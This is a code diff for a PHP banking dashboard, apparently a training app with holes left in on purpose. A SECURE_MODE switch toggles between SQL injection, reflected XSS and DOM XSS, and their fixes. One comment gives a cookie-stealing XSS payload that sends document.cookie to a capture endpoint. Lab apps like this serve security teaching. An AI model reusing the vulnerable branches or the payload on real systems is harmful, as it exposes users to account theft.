@@ -1,4 +1,5 @@
 <?php
+require_once 'config.php';
 require_once 'functions.php';
 redirect_if_not_logged_in();
 
@@ -9,8 +10,18 @@ $transactions = get_transactions($conn, $user['id']);
 $search_query = isset($_GET['search']) ? $_GET['search'] : '';
 
 // Loan summary
-$loan_sql = "SELECT SUM(amount) as total FROM loans WHERE user_id = {$user['id']} AND status = 'approved'";
-$loan_res = $conn->query($loan_sql);
+if (SECURE_MODE) {
+    // SECURE: Using prepared statement
+    $loan_sql = "SELECT SUM(amount) as total FROM loans WHERE user_id = ? AND status = 'approved'";
+    $stmt = $conn->prepare($loan_sql);
+    $stmt->bind_param("i", $user['id']);
+    $stmt->execute();
+    $loan_res = $stmt->get_result();
+} else {
+    // VULNERABLE: Direct SQL injection possible
+    $loan_sql = "SELECT SUM(amount) as total FROM loans WHERE user_id = {$user['id']} AND status = 'approved'";
+    $loan_res = $conn->query($loan_sql);
+}
 $loan_data = $loan_res->fetch_assoc();
 $total_loan = $loan_data['total'] ?? 0;
 ?>
@@ -37,7 +48,7 @@ $total_loan = $loan_data['total'] ?? 0;
                     <div style="position: relative;">
                         <form method="GET">
                             <i class="fas fa-search" style="position: absolute; left: 1rem; top: 50%; transform: translateY(-50%); color: var(--text-muted);"></i>
-                            <input type="text" name="search" class="search-input" placeholder="Search data..." style="padding-left: 2.5rem; width: 250px;" value="<?php echo $search_query; ?>">
+                            <input type="text" name="search" class="search-input" placeholder="Search data..." style="padding-left: 2.5rem; width: 250px;" value="<?php echo SECURE_MODE ? htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8') : $search_query; ?>">
                         </form>
                     </div>
                     <button class="btn btn-primary" onclick="toggleDarkMode()" style="width: 3rem; height: 3rem; padding: 0; justify-content: center; border-radius: 1rem;">
@@ -58,9 +69,17 @@ $total_loan = $loan_data['total'] ?? 0;
                 <div class="alert alert-info">
                     <i class="fas fa-info-circle"></i>
                     <!-- VULNERABLE: Reflected XSS -->
-                    Search results for: <span style="font-weight: 800;"><?php echo $search_query; ?></span>
+                    Search results for: <span style="font-weight: 800;"><?php echo SECURE_MODE ? htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8') : $search_query; ?></span>
                 </div>
             <?php endif; ?>
+
+            <!-- DOM-based XSS: URL Fragment -->
+            <div id="greeting-message" style="background: linear-gradient(135deg, rgba(14, 165, 233, 0.1), rgba(59, 130, 246, 0.05)); border-left: 4px solid var(--info); padding: 1rem 1.5rem; border-radius: 0.5rem; margin-bottom: 1.5rem; display: none;">
+                <div style="display: flex; align-items: center; gap: 0.75rem;">
+                    <i class="fas fa-bell" style="color: var(--info); font-size: 1.25rem;"></i>
+                    <div id="greeting-text" style="color: var(--info); font-weight: 600;"></div>
+                </div>
+            </div>
 
             <div class="dashboard-grid">
                 <div class="card" style="position: relative; overflow: hidden; background: linear-gradient(135deg, var(--primary), var(--primary-light)); border: none; color: white;">
@@ -177,6 +196,8 @@ $total_loan = $loan_data['total'] ?? 0;
     </div>
 
     <script>
+    const SECURE_MODE = <?php echo SECURE_MODE ? 'true' : 'false'; ?>;
+    
     function toggleDarkMode() {
         document.body.classList.toggle('dark-mode');
         localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light');
@@ -224,15 +245,24 @@ $total_loan = $loan_data['total'] ?? 0;
         setTimeout(() => toast.style.visibility = 'hidden', 2000);
     }
 
-    // DOM XSS from URL Hash
+    // DOM-based XSS from URL Hash
     window.addEventListener('load', () => {
         if (window.location.hash) {
-            const welcomeMsg = decodeURIComponent(window.location.hash.substring(1));
-            const alertDiv = document.createElement('div');
-            alertDiv.className = 'alert alert-success';
-            // VULNERABLE: DOM XSS
-            alertDiv.innerHTML = "<i class='fas fa-gift'></i> <span><strong>Promo Unlocked:</strong> " + welcomeMsg + "</span>";
-            document.querySelector('.main-content').prepend(alertDiv);
+            const greetingMsg = decodeURIComponent(window.location.hash.substring(1));
+            const greetingDiv = document.getElementById('greeting-message');
+            const greetingText = document.getElementById('greeting-text');
+            
+            // VULNERABLE: Using innerHTML with unsanitized hash data
+            // Payload example: #Special-Offer!<img src=x onerror="fetch('http://localhost:8082/capture.php?cookie='+document.cookie)">
+            if (SECURE_MODE) {
+                // SECURE: Sanitize with textContent and htmlspecialchars
+                greetingText.textContent = greetingMsg;
+            } else {
+                // VULNERABLE: Direct innerHTML - DOM XSS
+                greetingText.innerHTML = greetingMsg;
+            }
+            
+            greetingDiv.style.display = 'flex';
         }
     });
     </script>
